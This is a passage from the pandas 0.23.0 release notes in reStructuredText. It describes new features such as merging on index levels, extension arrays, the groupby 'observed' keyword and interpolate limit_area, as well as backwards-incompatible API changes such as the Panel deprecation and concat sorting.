ipython:: python\n\n    df = pd.DataFrame({'A': [1, 2, 3]})\n    df\n    df.assign(B=df.A, C=lambda x: x['A'] + x['B'])\n\n.. warning::\n\n  This may subtly change the behavior of your code when you're\n  using ``.assign()`` to update an existing column. Previously, callables\n  referring to other variables being updated would get the \"old\" values\n\n  Previous behavior:\n\n  .. code-block:: ipython\n\n      In [2]: df = pd.DataFrame({\"A\": [1, 2, 3]})\n\n      In [3]: df.assign(A=lambda df: df.A + 1, C=lambda df: df.A * -1)\n      Out[3]:\n         A  C\n      0  2 -1\n      1  3 -2\n      2  4 -3\n\n  New behavior:\n\n  .. ipython:: python\n\n      df.assign(A=df.A + 1, C=lambda df: df.A * -1)\n\n\n\n.. _whatsnew_0230.enhancements.merge_on_columns_and_levels:\n\nMerging on a combination of columns and index levels\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nStrings passed to :meth:`DataFrame.merge` as the ``on``, ``left_on``, and ``right_on``\nparameters may now refer to either column names or index level names.\nThis enables merging ``DataFrame`` instances on a combination of index levels\nand columns without resetting indexes. See the :ref:`Merge on columns and\nlevels <merging.merge_on_columns_and_levels>` documentation section.\n(:issue:`14355`)\n\n.. ipython:: python\n\n   left_index = pd.Index(['K0', 'K0', 'K1', 'K2'], name='key1')\n\n   left = pd.DataFrame({'A': ['A0', 'A1', 'A2', 'A3'],\n                        'B': ['B0', 'B1', 'B2', 'B3'],\n                        'key2': ['K0', 'K1', 'K0', 'K1']},\n                       index=left_index)\n\n   right_index = pd.Index(['K0', 'K1', 'K2', 'K2'], name='key1')\n\n   right = pd.DataFrame({'C': ['C0', 'C1', 'C2', 'C3'],\n                         'D': ['D0', 'D1', 'D2', 'D3'],\n                         'key2': ['K0', 'K0', 'K0', 'K1']},\n                        index=right_index)\n\n   left.merge(right, on=['key1', 'key2'])\n\n.. _whatsnew_0230.enhancements.sort_by_columns_and_levels:\n\nSorting by a combination of columns and index levels\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nStrings passed to :meth:`DataFrame.sort_values` as the ``by`` parameter may\nnow refer to either column names or index level names.  This enables sorting\n``DataFrame`` instances by a combination of index levels and columns without\nresetting indexes. See the :ref:`Sorting by Indexes and Values\n<basics.sort_indexes_and_values>` documentation section.\n(:issue:`14353`)\n\n.. ipython:: python\n\n    Build MultiIndex\n   idx = pd.MultiIndex.from_tuples([('a', 1), ('a', 2), ('a', 2),\n                                    ('b', 2), ('b', 1), ('b', 1)])\n   idx.names = ['first', 'second']\n\n    Build DataFrame\n   df_multi = pd.DataFrame({'A': np.arange(6, 0, -1)},\n                           index=idx)\n   df_multi\n\n    Sort by 'second' (index) and 'A' (column)\n   df_multi.sort_values(by=['second', 'A'])\n\n\n.. _whatsnew_023.enhancements.extension:\n\nExtending pandas with custom types (experimental)\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\npandas now supports storing array-like objects that aren't necessarily 1-D NumPy\narrays as columns in a DataFrame or values in a Series. This allows third-party\nlibraries to implement extensions to NumPy's types, similar to how pandas\nimplemented categoricals, datetimes with timezones, periods, and intervals.\n\nAs a demonstration, we'll use cyberpandas_, which provides an ``IPArray`` type\nfor storing ip addresses.\n\n.. code-block:: ipython\n\n   In [1]: from cyberpandas import IPArray\n\n   In [2]: values = IPArray([\n      ...:     0,\n      ...:     3232235777,\n      ...:     42540766452641154071740215577757643572\n      ...: ])\n      ...:\n      ...:\n\n``IPArray`` isn't a normal 1-D NumPy array, but because it's a pandas\n:class:`~pandas.api.extensions.ExtensionArray`, it can be stored properly inside pandas' containers.\n\n.. code-block:: ipython\n\n   In [3]: ser = pd.Series(values)\n\n   In [4]: ser\n   Out[4]:\n   0                         0.0.0.0\n   1                     192.168.1.1\n   2    2001:db8:85a3::8a2e:370:7334\n   dtype: ip\n\nNotice that the dtype is ``ip``. The missing value semantics of the underlying\narray are respected:\n\n.. code-block:: ipython\n\n   In [5]: ser.isna()\n   Out[5]:\n   0     True\n   1    False\n   2    False\n   dtype: bool\n\nFor more, see the :ref:`extension types <extending.extension-types>`\ndocumentation. If you build an extension array, publicize it on `the ecosystem page <https://pandas.pydata.org/community/ecosystem.html>`_.\n\n.. _cyberpandas: https://cyberpandas.readthedocs.io/en/latest/\n\n\n.. _whatsnew_0230.enhancements.categorical_grouping:\n\nNew ``observed`` keyword for excluding unobserved categories in ``GroupBy``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nGrouping by a categorical includes the unobserved categories in the output.\nWhen grouping by multiple categorical columns, this means you get the cartesian product of all the\ncategories, including combinations where there are no observations, which can result in a large\nnumber of groups. We have added a keyword ``observed`` to control this behavior, it defaults to\n``observed=False`` for backward-compatibility. (:issue:`14942`, :issue:`8138`, :issue:`15217`, :issue:`17594`, :issue:`8669`, :issue:`20583`, :issue:`20902`)\n\n.. ipython:: python\n\n   cat1 = pd.Categorical([\"a\", \"a\", \"b\", \"b\"],\n                         categories=[\"a\", \"b\", \"z\"], ordered=True)\n   cat2 = pd.Categorical([\"c\", \"d\", \"c\", \"d\"],\n                         categories=[\"c\", \"d\", \"y\"], ordered=True)\n   df = pd.DataFrame({\"A\": cat1, \"B\": cat2, \"values\": [1, 2, 3, 4]})\n   df['C'] = ['foo', 'bar'] * 2\n   df\n\nTo show all values, the previous behavior:\n\n.. ipython:: python\n\n   df.groupby(['A', 'B', 'C'], observed=False).count()\n\n\nTo show only observed values:\n\n.. ipython:: python\n\n   df.groupby(['A', 'B', 'C'], observed=True).count()\n\nFor pivoting operations, this behavior is *already* controlled by the ``dropna`` keyword:\n\n.. ipython:: python\n\n   cat1 = pd.Categorical([\"a\", \"a\", \"b\", \"b\"],\n                         categories=[\"a\", \"b\", \"z\"], ordered=True)\n   cat2 = pd.Categorical([\"c\", \"d\", \"c\", \"d\"],\n                         categories=[\"c\", \"d\", \"y\"], ordered=True)\n   df = pd.DataFrame({\"A\": cat1, \"B\": cat2, \"values\": [1, 2, 3, 4]})\n   df\n\n\n.. code-block:: ipython\n\n    In [1]: pd.pivot_table(df, values='values', index=['A', 'B'], dropna=True)\n\n    Out[1]:\n         values\n    A B\n    a c     1.0\n      d     2.0\n    b c     3.0\n      d     4.0\n\n    In [2]: pd.pivot_table(df, values='values', index=['A', 'B'], dropna=False)\n\n    Out[2]:\n         values\n    A B\n    a c     1.0\n      d     2.0\n      y     NaN\n    b c     3.0\n      d     4.0\n      y     NaN\n    z c     NaN\n      d     NaN\n      y     NaN\n\n\n.. _whatsnew_0230.enhancements.window_raw:\n\nRolling/Expanding.apply() accepts ``raw=False`` to pass a ``Series`` to the function\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:func:`Series.rolling().apply() <.Rolling.apply>`, :func:`DataFrame.rolling().apply() <.Rolling.apply>`,\n:func:`Series.expanding().apply() <.Expanding.apply>`, and :func:`DataFrame.expanding().apply() <.Expanding.apply>` have gained a ``raw=None`` parameter.\nThis is similar to :func:`DataFame.apply`. This parameter, if ``True`` allows one to send a ``np.ndarray`` to the applied function. If ``False`` a ``Series`` will be passed. The\ndefault is ``None``, which preserves backward compatibility, so this will default to ``True``, sending an ``np.ndarray``.\nIn a future version the default will be changed to ``False``, sending a ``Series``. (:issue:`5071`, :issue:`20584`)\n\n.. ipython:: python\n\n   s = pd.Series(np.arange(5), np.arange(5) + 1)\n   s\n\nPass a ``Series``:\n\n.. ipython:: python\n\n   s.rolling(2, min_periods=1).apply(lambda x: x.iloc[-1], raw=False)\n\nMimic the original behavior of passing a ndarray:\n\n.. ipython:: python\n\n   s.rolling(2, min_periods=1).apply(lambda x: x[-1], raw=True)\n\n\n.. _whatsnew_0210.enhancements.limit_area:\n\n``DataFrame.interpolate`` has gained the ``limit_area`` kwarg\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:meth:`DataFrame.interpolate` has gained a ``limit_area`` parameter to allow further control of which ``NaN`` s are replaced.\nUse ``limit_area='inside'`` to fill only NaNs surrounded by valid values or use ``limit_area='outside'`` to fill only ``NaN`` s\noutside the existing valid values while preserving those inside.  (:issue:`16284`) See the :ref:`full documentation here <missing_data.interp_limits>`.\n\n\n.. ipython:: python\n\n   ser = pd.Series([np.nan, np.nan, 5, np.nan, np.nan,\n                    np.nan, 13, np.nan, np.nan])\n   ser\n\nFill one consecutive inside value in both directions\n\n.. ipython:: python\n\n   ser.interpolate(limit_direction='both', limit_area='inside', limit=1)\n\nFill all consecutive outside values backward\n\n.. ipython:: python\n\n   ser.interpolate(limit_direction='backward', limit_area='outside')\n\nFill all consecutive outside values in both directions\n\n.. ipython:: python\n\n   ser.interpolate(limit_direction='both', limit_area='outside')\n\n.. _whatsnew_0210.enhancements.get_dummies_dtype:\n\nFunction ``get_dummies`` now supports ``dtype`` argument\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe :func:`get_dummies` now accepts a ``dtype`` argument, which specifies a dtype for the new columns. The default remains uint8. (:issue:`18330`)\n\n.. ipython:: python\n\n   df = pd.DataFrame({'a': [1, 2], 'b': [3, 4], 'c': [5, 6]})\n   pd.get_dummies(df, columns=['c']).dtypes\n   pd.get_dummies(df, columns=['c'], dtype=bool).dtypes\n\n\n.. _whatsnew_0230.enhancements.timedelta_mod:\n\nTimedelta mod method\n^^^^^^^^^^^^^^^^^^^^\n\n``mod`` (%) and ``divmod`` operations are now defined on ``Timedelta`` objects\nwhen operating with either timedelta-like or with numeric arguments.\nSee the :ref:`documentation here <timedeltas.mod_divmod>`. (:issue:`19365`)\n\n.. ipython:: python\n\n    td = pd.Timedelta(hours=37)\n    td % pd.Timedelta(minutes=45)\n\n.. _whatsnew_0230.enhancements.ran_inf:\n\nMethod ``.rank()`` handles ``inf`` values when ``NaN`` are present\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn previous versions, ``.rank()`` would assign ``inf`` elements ``NaN`` as their ranks. Now ranks are calculated properly. (:issue:`6945`)\n\n.. ipython:: python\n\n    s = pd.Series([-np.inf, 0, 1, np.nan, np.inf])\n    s\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n    In [11]: s.rank()\n    Out[11]:\n    0    1.0\n    1    2.0\n    2    3.0\n    3    NaN\n    4    NaN\n    dtype: float64\n\nCurrent behavior:\n\n.. ipython:: python\n\n    s.rank()\n\nFurthermore, previously if you rank ``inf`` or ``-inf`` values together with ``NaN`` values, the calculation won't distinguish ``NaN`` from infinity when using 'top' or 'bottom' argument.\n\n.. ipython:: python\n\n    s = pd.Series([np.nan, np.nan, -np.inf, -np.inf])\n    s\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n    In [15]: s.rank(na_option='top')\n    Out[15]:\n    0    2.5\n    1    2.5\n    2    2.5\n    3    2.5\n    dtype: float64\n\nCurrent behavior:\n\n.. ipython:: python\n\n    s.rank(na_option='top')\n\nThese bugs were squashed:\n\n- Bug in :meth:`DataFrame.rank` and :meth:`Series.rank` when ``method='dense'`` and ``pct=True`` in which percentile ranks were not being used with the number of distinct observations (:issue:`15630`)\n- Bug in :meth:`Series.rank` and :meth:`DataFrame.rank` when ``ascending='False'`` failed to return correct ranks for infinity if ``NaN`` were present (:issue:`19538`)\n- Bug in :func:`DataFrameGroupBy.rank` where ranks were incorrect when both infinity and ``NaN`` were present (:issue:`20561`)\n\n\n.. _whatsnew_0230.enhancements.str_cat_align:\n\n``Series.str.cat`` has gained the ``join`` kwarg\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nPreviously, :meth:`Series.str.cat` did not -- in contrast to most of ``pandas`` -- align :class:`Series` on their index before concatenation (see :issue:`18657`).\nThe method has now gained a keyword ``join`` to control the manner of alignment, see examples below and :ref:`here <text.concatenate>`.\n\nIn v.0.23 ``join`` will default to None (meaning no alignment), but this default will change to ``'left'`` in a future version of pandas.\n\n.. ipython:: python\n   :okwarning:\n\n    s = pd.Series(['a', 'b', 'c', 'd'])\n    t = pd.Series(['b', 'd', 'e', 'c'], index=[1, 3, 4, 2])\n    s.str.cat(t)\n    s.str.cat(t, join='left', na_rep='-')\n\nFurthermore, :meth:`Series.str.cat` now works for ``CategoricalIndex`` as well (previously raised a ``ValueError``; see :issue:`20842`).\n\n.. _whatsnew_0230.enhancements.astype_category:\n\n``DataFrame.astype`` performs column-wise conversion to ``Categorical``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:meth:`DataFrame.astype` can now perform column-wise conversion to ``Categorical`` by supplying the string ``'category'`` or\na :class:`~pandas.api.types.CategoricalDtype`. Previously, attempting this would raise a ``NotImplementedError``. See the\n:ref:`categorical.objectcreation` section of the documentation for more details and examples. (:issue:`12860`, :issue:`18099`)\n\nSupplying the string ``'category'`` performs column-wise conversion, with only labels appearing in a given column set as categories:\n\n.. ipython:: python\n\n    df = pd.DataFrame({'A': list('abca'), 'B': list('bccd')})\n    df = df.astype('category')\n    df['A'].dtype\n    df['B'].dtype\n\n\nSupplying a ``CategoricalDtype`` will make the categories in each column consistent with the supplied dtype:\n\n.. ipython:: python\n\n    from pandas.api.types import CategoricalDtype\n    df = pd.DataFrame({'A': list('abca'), 'B': list('bccd')})\n    cdt = CategoricalDtype(categories=list('abcd'), ordered=True)\n    df = df.astype(cdt)\n    df['A'].dtype\n    df['B'].dtype\n\n\n.. _whatsnew_0230.enhancements.other:\n\nOther enhancements\n^^^^^^^^^^^^^^^^^^\n\n- Unary ``+`` now permitted for ``Series`` and ``DataFrame`` as  numeric operator (:issue:`16073`)\n- Better support for :meth:`~pandas.io.formats.style.Styler.to_excel` output with the ``xlsxwriter`` engine. (:issue:`16149`)\n- :func:`pandas.tseries.frequencies.to_offset` now accepts leading '+' signs e.g. '+1h'. (:issue:`18171`)\n- :func:`MultiIndex.unique` now supports the ``level=`` argument, to get unique values from a specific index level (:issue:`17896`)\n- :class:`pandas.io.formats.style.Styler` now has method ``hide_index()`` to determine whether the index will be rendered in output (:issue:`14194`)\n- :class:`pandas.io.formats.style.Styler` now has method ``hide_columns()`` to determine whether columns will be hidden in output (:issue:`14194`)\n- Improved wording of ``ValueError`` raised in :func:`to_datetime` when ``unit=`` is passed with a non-convertible value (:issue:`14350`)\n- :func:`Series.fillna` now accepts a Series or a dict as a ``value`` for a categorical dtype (:issue:`17033`)\n- :func:`pandas.read_clipboard` updated to use qtpy, falling back to PyQt5 and then PyQt4, adding compatibility with Python3 and multiple python-qt bindings (:issue:`17722`)\n- Improved wording of ``ValueError`` raised in :func:`read_csv` when the ``usecols`` argument cannot match all columns. (:issue:`17301`)\n- :func:`DataFrame.corrwith` now silently drops non-numeric columns when passed a Series. Before, an exception was raised (:issue:`18570`).\n- :class:`IntervalIndex` now supports time zone aware ``Interval`` objects (:issue:`18537`, :issue:`18538`)\n- :func:`Series` / :func:`DataFrame` tab completion also returns identifiers in the first level of a :func:`MultiIndex`. (:issue:`16326`)\n- :func:`read_excel()` has gained the ``nrows`` parameter (:issue:`16645`)\n- :meth:`DataFrame.append` can now in more cases preserve the type of the calling dataframe's columns (e.g. if both are ``CategoricalIndex``) (:issue:`18359`)\n- :meth:`DataFrame.to_json` and :meth:`Series.to_json` now accept an ``index`` argument which allows the user to exclude the index from the JSON output (:issue:`17394`)\n- ``IntervalIndex.to_tuples()`` has gained the ``na_tuple`` parameter to control whether NA is returned as a tuple of NA, or NA itself (:issue:`18756`)\n- ``Categorical.rename_categories``, ``CategoricalIndex.rename_categories`` and :attr:`Series.cat.rename_categories`\n  can now take a callable as their argument (:issue:`18862`)\n- :class:`Interval` and :class:`IntervalIndex` have gained a ``length`` attribute (:issue:`18789`)\n- ``Resampler`` objects now have a functioning :attr:`.Resampler.pipe` method.\n  Previously, calls to ``pipe`` were diverted to  the ``mean`` method (:issue:`17905`).\n- :func:`~pandas.api.types.is_scalar` now returns ``True`` for ``DateOffset`` objects (:issue:`18943`).\n- :func:`DataFrame.pivot` now accepts a list for the ``values=`` kwarg (:issue:`17160`).\n- Added :func:`pandas.api.extensions.register_dataframe_accessor`,\n  :func:`pandas.api.extensions.register_series_accessor`, and\n  :func:`pandas.api.extensions.register_index_accessor`, accessor for libraries downstream of pandas\n  to register custom accessors like ``.cat`` on pandas objects. See\n  :ref:`Registering Custom Accessors <extending.register-accessors>` for more (:issue:`14781`).\n\n- ``IntervalIndex.astype`` now supports conversions between subtypes when passed an ``IntervalDtype`` (:issue:`19197`)\n- :class:`IntervalIndex` and its associated constructor methods (``from_arrays``, ``from_breaks``, ``from_tuples``) have gained a ``dtype`` parameter (:issue:`19262`)\n- Added :func:`.SeriesGroupBy.is_monotonic_increasing` and :func:`.SeriesGroupBy.is_monotonic_decreasing` (:issue:`17015`)\n- For subclassed ``DataFrames``, :func:`DataFrame.apply` will now preserve the ``Series`` subclass (if defined) when passing the data to the applied function (:issue:`19822`)\n- :func:`DataFrame.from_dict` now accepts a ``columns`` argument that can be used to specify the column names when ``orient='index'`` is used (:issue:`18529`)\n- Added option ``display.html.use_mathjax`` so `MathJax <https://www.mathjax.org/>`_ can be disabled when rendering tables in ``Jupyter`` notebooks (:issue:`19856`, :issue:`19824`)\n- :func:`DataFrame.replace` now supports the ``method`` parameter, which can be used to specify the replacement method when ``to_replace`` is a scalar, list or tuple and ``value`` is ``None`` (:issue:`19632`)\n- :meth:`Timestamp.month_name`, :meth:`DatetimeIndex.month_name`, and :meth:`Series.dt.month_name` are now available (:issue:`12805`)\n- :meth:`Timestamp.day_name` and :meth:`DatetimeIndex.day_name` are now available to return day names with a specified locale (:issue:`12806`)\n- :meth:`DataFrame.to_sql` now performs a multi-value insert if the underlying connection supports itk rather than inserting row by row.\n  ``SQLAlchemy`` dialects supporting multi-value inserts include: ``mysql``, ``postgresql``, ``sqlite`` and any dialect with ``supports_multivalues_insert``. (:issue:`14315`, :issue:`8953`)\n- :func:`read_html` now accepts a ``displayed_only`` keyword argument to controls whether or not hidden elements are parsed (``True`` by default) (:issue:`20027`)\n- :func:`read_html` now reads all ``<tbody>`` elements in a ``<table>``, not just the first. (:issue:`20690`)\n- :meth:`.Rolling.quantile` and :meth:`.Expanding.quantile` now accept the ``interpolation`` keyword, ``linear`` by default (:issue:`20497`)\n- zip compression is supported via ``compression=zip`` in :func:`DataFrame.to_pickle`, :func:`Series.to_pickle`, :func:`DataFrame.to_csv`, :func:`Series.to_csv`, :func:`DataFrame.to_json`, :func:`Series.to_json`. (:issue:`17778`)\n- :class:`~pandas.tseries.offsets.WeekOfMonth` constructor now supports ``n=0`` (:issue:`20517`).\n- :class:`DataFrame` and :class:`Series` now support matrix multiplication (````) operator (:issue:`10259`) for Python>=3.5\n- Updated :meth:`DataFrame.to_gbq` and :meth:`pandas.read_gbq` signature and documentation to reflect changes from\n  the pandas-gbq library version 0.4.0. Adds intersphinx mapping to pandas-gbq\n  library. (:issue:`20564`)\n- Added new writer for exporting Stata dta files in version 117, ``StataWriter117``.  This format supports exporting strings with lengths up to 2,000,000 characters (:issue:`16450`)\n- :func:`to_hdf` and :func:`read_hdf` now accept an ``errors`` keyword argument to control encoding error handling (:issue:`20835`)\n- :func:`cut` has gained the ``duplicates='raise'|'drop'`` option to control whether to raise on duplicated edges (:issue:`20947`)\n- :func:`date_range`, :func:`timedelta_range`, and :func:`interval_range` now return a linearly spaced index if ``start``, ``stop``, and ``periods`` are specified, but ``freq`` is not. (:issue:`20808`, :issue:`20983`, :issue:`20976`)\n\n.. _whatsnew_0230.api_breaking:\n\nBackwards incompatible API changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n.. _whatsnew_0230.api_breaking.deps:\n\nDependencies have increased minimum versions\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWe have updated our minimum supported versions of dependencies (:issue:`15184`).\nIf installed, we now require:\n\n+-----------------+-----------------+----------+---------------+\n| Package         | Minimum Version | Required |     Issue     |\n+=================+=================+==========+===============+\n| python-dateutil | 2.5.0           |    X     | :issue:`15184`|\n+-----------------+-----------------+----------+---------------+\n| openpyxl        | 2.4.0           |          | :issue:`15184`|\n+-----------------+-----------------+----------+---------------+\n| beautifulsoup4  | 4.2.1           |          | :issue:`20082`|\n+-----------------+-----------------+----------+---------------+\n| setuptools      | 24.2.0          |          | :issue:`20698`|\n+-----------------+-----------------+----------+---------------+\n\n.. _whatsnew_0230.api_breaking.dict_insertion_order:\n\nInstantiation from dicts preserves dict insertion order for Python 3.6+\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nUntil Python 3.6, dicts in Python had no formally defined ordering. For Python\nversion 3.6 and later, dicts are ordered by insertion order, see\n`PEP 468 <https://www.python.org/dev/peps/pep-0468/>`_.\npandas will use the dict's insertion order, when creating a ``Series`` or\n``DataFrame`` from a dict and you're using Python version 3.6 or\nhigher. (:issue:`19884`)\n\nPrevious behavior (and current behavior if on Python < 3.6):\n\n.. code-block:: ipython\n\n    In [16]: pd.Series({'Income': 2000,\n       ....:            'Expenses': -1500,\n       ....:            'Taxes': -200,\n       ....:            'Net result': 300})\n    Out[16]:\n    Expenses     -1500\n    Income        2000\n    Net result     300\n    Taxes         -200\n    dtype: int64\n\nNote the Series above is ordered alphabetically by the index values.\n\nNew behavior (for Python >= 3.6):\n\n.. ipython:: python\n\n    pd.Series({'Income': 2000,\n               'Expenses': -1500,\n               'Taxes': -200,\n               'Net result': 300})\n\nNotice that the Series is now ordered by insertion order. This new behavior is\nused for all relevant pandas types (``Series``, ``DataFrame``, ``SparseSeries``\nand ``SparseDataFrame``).\n\nIf you wish to retain the old behavior while using Python >= 3.6, you can use\n``.sort_index()``:\n\n.. ipython:: python\n\n    pd.Series({'Income': 2000,\n               'Expenses': -1500,\n               'Taxes': -200,\n               'Net result': 300}).sort_index()\n\n.. _whatsnew_0230.api_breaking.deprecate_panel:\n\nDeprecate Panel\n^^^^^^^^^^^^^^^\n\n``Panel`` was deprecated in the 0.20.x release, showing as a ``DeprecationWarning``. Using ``Panel`` will now show a ``FutureWarning``. The recommended way to represent 3-D data are\nwith a ``MultiIndex`` on a ``DataFrame`` via the :meth:`~Panel.to_frame` or with the `xarray package <http://xarray.pydata.org/en/stable/>`__. pandas\nprovides a :meth:`~Panel.to_xarray` method to automate this conversion (:issue:`13563`, :issue:`18324`).\n\n.. code-block:: ipython\n\n    In [75]: import pandas._testing as tm\n\n    In [76]: p = tm.makePanel()\n\n    In [77]: p\n    Out[77]:\n    <class 'pandas.core.panel.Panel'>\n    Dimensions: 3 (items) x 3 (major_axis) x 4 (minor_axis)\n    Items axis: ItemA to ItemC\n    Major_axis axis: 2000-01-03 00:00:00 to 2000-01-05 00:00:00\n    Minor_axis axis: A to D\n\nConvert to a MultiIndex DataFrame\n\n.. code-block:: ipython\n\n    In [78]: p.to_frame()\n    Out[78]:\n                         ItemA     ItemB     ItemC\n    major      minor\n    2000-01-03 A      0.469112  0.721555  0.404705\n               B     -1.135632  0.271860 -1.039268\n               C      0.119209  0.276232 -1.344312\n               D     -2.104569  0.113648 -0.109050\n    2000-01-04 A     -0.282863 -0.706771  0.577046\n               B      1.212112 -0.424972 -0.370647\n               C     -1.044236 -1.087401  0.844885\n               D     -0.494929 -1.478427  1.643563\n    2000-01-05 A     -1.509059 -1.039575 -1.715002\n               B     -0.173215  0.567020 -1.157892\n               C     -0.861849 -0.673690  1.075770\n               D      1.071804  0.524988 -1.469388\n\n    [12 rows x 3 columns]\n\nConvert to an xarray DataArray\n\n.. code-block:: ipython\n\n    In [79]: p.to_xarray()\n    Out[79]:\n    <xarray.DataArray (items: 3, major_axis: 3, minor_axis: 4)>\n    array([[[ 0.469112, -1.135632,  0.119209, -2.104569],\n            [-0.282863,  1.212112, -1.044236, -0.494929],\n            [-1.509059, -0.173215, -0.861849,  1.071804]],\n\n           [[ 0.721555,  0.27186 ,  0.276232,  0.113648],\n            [-0.706771, -0.424972, -1.087401, -1.478427],\n            [-1.039575,  0.56702 , -0.67369 ,  0.524988]],\n\n           [[ 0.404705, -1.039268, -1.344312, -0.10905 ],\n            [ 0.577046, -0.370647,  0.844885,  1.643563],\n            [-1.715002, -1.157892,  1.07577 , -1.469388]]])\n    Coordinates:\n      * items       (items) object 'ItemA' 'ItemB' 'ItemC'\n      * major_axis  (major_axis) datetime64[ns] 2000-01-03 2000-01-04 2000-01-05\n      * minor_axis  (minor_axis) object 'A' 'B' 'C' 'D'\n\n\n.. _whatsnew_0230.api_breaking.core_common:\n\npandas.core.common removals\n^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe following error & warning messages are removed from ``pandas.core.common`` (:issue:`13634`, :issue:`19769`):\n\n- ``PerformanceWarning``\n- ``UnsupportedFunctionCall``\n- ``UnsortedIndexError``\n- ``AbstractMethodError``\n\nThese are available from import from ``pandas.errors`` (since 0.19.0).\n\n\n.. _whatsnew_0230.api_breaking.apply:\n\nChanges to make output of ``DataFrame.apply`` consistent\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:func:`DataFrame.apply` was inconsistent when applying an arbitrary user-defined-function that returned a list-like with ``axis=1``. Several bugs and inconsistencies\nare resolved. If the applied function returns a Series, then pandas will return a DataFrame; otherwise a Series will be returned, this includes the case\nwhere a list-like (e.g. ``tuple`` or ``list`` is returned) (:issue:`16353`, :issue:`17437`, :issue:`17970`, :issue:`17348`, :issue:`17892`, :issue:`18573`,\n:issue:`17602`, :issue:`18775`, :issue:`18901`, :issue:`18919`).\n\n.. ipython:: python\n\n    df = pd.DataFrame(np.tile(np.arange(3), 6).reshape(6, -1) + 1,\n                      columns=['A', 'B', 'C'])\n    df\n\nPrevious behavior: if the returned shape happened to match the length of original columns, this would return a ``DataFrame``.\nIf the return shape did not match, a ``Series`` with lists was returned.\n\n.. code-block:: python\n\n   In [3]: df.apply(lambda x: [1, 2, 3], axis=1)\n   Out[3]:\n      A  B  C\n   0  1  2  3\n   1  1  2  3\n   2  1  2  3\n   3  1  2  3\n   4  1  2  3\n   5  1  2  3\n\n   In [4]: df.apply(lambda x: [1, 2], axis=1)\n   Out[4]:\n   0    [1, 2]\n   1    [1, 2]\n   2    [1, 2]\n   3    [1, 2]\n   4    [1, 2]\n   5    [1, 2]\n   dtype: object\n\n\nNew behavior: When the applied function returns a list-like, this will now *always* return a ``Series``.\n\n.. ipython:: python\n\n    df.apply(lambda x: [1, 2, 3], axis=1)\n    df.apply(lambda x: [1, 2], axis=1)\n\nTo have expanded columns, you can use ``result_type='expand'``\n\n.. ipython:: python\n\n    df.apply(lambda x: [1, 2, 3], axis=1, result_type='expand')\n\nTo broadcast the result across the original columns (the old behaviour for\nlist-likes of the correct length), you can use ``result_type='broadcast'``.\nThe shape must match the original columns.\n\n.. ipython:: python\n\n    df.apply(lambda x: [1, 2, 3], axis=1, result_type='broadcast')\n\nReturning a ``Series`` allows one to control the exact return structure and column names:\n\n.. ipython:: python\n\n    df.apply(lambda x: pd.Series([1, 2, 3], index=['D', 'E', 'F']), axis=1)\n\n.. _whatsnew_0230.api_breaking.concat:\n\nConcatenation will no longer sort\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn a future version of pandas :func:`pandas.concat` will no longer sort the non-concatenation axis when it is not already aligned.\nThe current behavior is the same as the previous (sorting), but now a warning is issued when ``sort`` is not specified and the non-concatenation axis is not aligned (:issue:`4588`).\n\n.. ipython:: python\n   :okwarning:\n\n   df1 = pd.DataFrame({\"a\": [1, 2], \"b\": [1, 2]}, columns=['b', 'a'])\n   df2 = pd.DataFrame({\"a\": [4, 5]})\n\n   pd.concat([df1, df2])\n\nTo keep the previous behavior (sorting) and silence the warning, pass ``sort=True``\n\n.. ipython:: python\n\n   pd.concat([df1, df2], sort=True)\n\nTo accept the future behavior (no sorting), pass ``sort=False``\n\n.. ipython\n\n   pd.concat([df1, df2], sort=False)\n\nNote that this change also applies to :meth:`DataFrame.append`, which has also received a ``sort`` keyword for controlling this behavior.\n\n\n.. _whatsnew_0230.api_breaking.build_changes:\n\nBuild changes\n^^^^^^^^^^^^^\n\n- Building pandas for development now requires ``cython >= 0.24`` (:issue:`18613`)\n- Building from source now explicitly requires ``setuptools`` in ``setup.py`` (:issue:`18113`)\n- Updated conda recipe to be in compliance with conda-build 3.0+ (:issue:`18002`)\n\n.. _whatsnew_0230.api_breaking.index_division_by_zero:\n\nIndex division by zero fills correctly\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nDivision operations on ``Index`` and subclasses will now fill division of positive numbers by zero with ``np.inf``, division of negative numbers by zero with ``-np.inf`` and ``0 / 0`` with ``np.nan``.  This matches existing ``Series`` behavior. (:issue:`19322`, :issue:`19347`)\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n    In [6]: index = pd.Int64Index([-1, 0, 1])\n\n    In [7]: index / 0\n    Out[7]: Int64Index([0, 0, 0], dtype='int64')\n\n     Previous behavior yielded different results depending on the type of zero in the divisor\n    In [8]: index / 0.0\n    Out[8]: Float64Index([-inf, nan, inf], dtype='float64')\n\n    In 